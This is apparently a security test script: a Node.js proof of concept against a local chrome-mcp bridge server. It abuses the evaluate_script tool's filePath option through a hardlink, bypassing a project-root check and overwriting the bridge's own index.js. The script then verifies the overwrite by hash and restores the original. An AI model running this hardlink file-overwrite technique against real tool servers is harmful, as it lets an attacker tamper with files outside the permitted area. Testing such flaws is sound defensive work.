import fs from 'node:fs';
import crypto from 'node:crypto';
const BASE = 'http://127.0.0.1:7890/mcp';
let sid, i = 0;
const rpc = async b => {
  const r = await fetch(BASE, { method: 'POST', headers: { 'content-type': 'application/json', 'accept': 'application/json, text/event-stream', ...(sid ? { 'mcp-session-id': sid } : {}) }, body: JSON.stringify(b) });
  const t = await r.text();
  if (!sid) sid = r.headers.get('mcp-session-id');
  const m = t.split('\n').filter(l => l.startsWith('data:')).map(l => JSON.parse(l.slice(5).trim()));
  return m[m.length - 1];
};
await rpc({ jsonrpc: '2.0', id: ++i, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 'a17b', version: '0' } } });
await rpc({ jsonrpc: '2.0', method: 'notifications/initialized' });
const call = (n, a) => rpc({ jsonrpc: '2.0', id: ++i, method: 'tools/call', params: { name: n, arguments: a } });
const text = r => r?.result?.content?.[0]?.text ?? JSON.stringify(r);
const sha = p => crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex');

const idx = 'D:/Tool/chrome-mcp/bridge/index.js';
const hl = 'D:/Tool/adv17-hl.txt';
const np = await call('new_page', { url: 'https://example.com' });
const pageId = JSON.parse(text(np).slice(text(np).indexOf('{'))).pageId;
console.log('pageId=', pageId);
const before = sha(idx);
console.log('index.js sha before:', before.slice(0, 16));
// hardlink outside repo, exists -> not under PROJECT_ROOT -> writeOut proceeds
const r = await call('evaluate_script', { pageId, function: '() => "PWNED-VIA-HARDLINK"', filePath: hl });
console.log('resp:', text(r).split('\n')[0]);
const after = sha(idx);
console.log('index.js sha after :', after.slice(0, 16), after !== before ? '*** INDEX.JS OVERWRITTEN VIA HARDLINK ***' : 'intact');
if (after !== before) {
  fs.copyFileSync('C:/Users/29980/AppData/Local/Temp/adv17-index.js.bak', idx);
  console.log('restored. sha now:', sha(idx).slice(0, 16));
}
fs.rmSync(hl, { force: true });
console.log('hardlink removed:', !fs.existsSync(hl));
await call('close_page', { pageId });
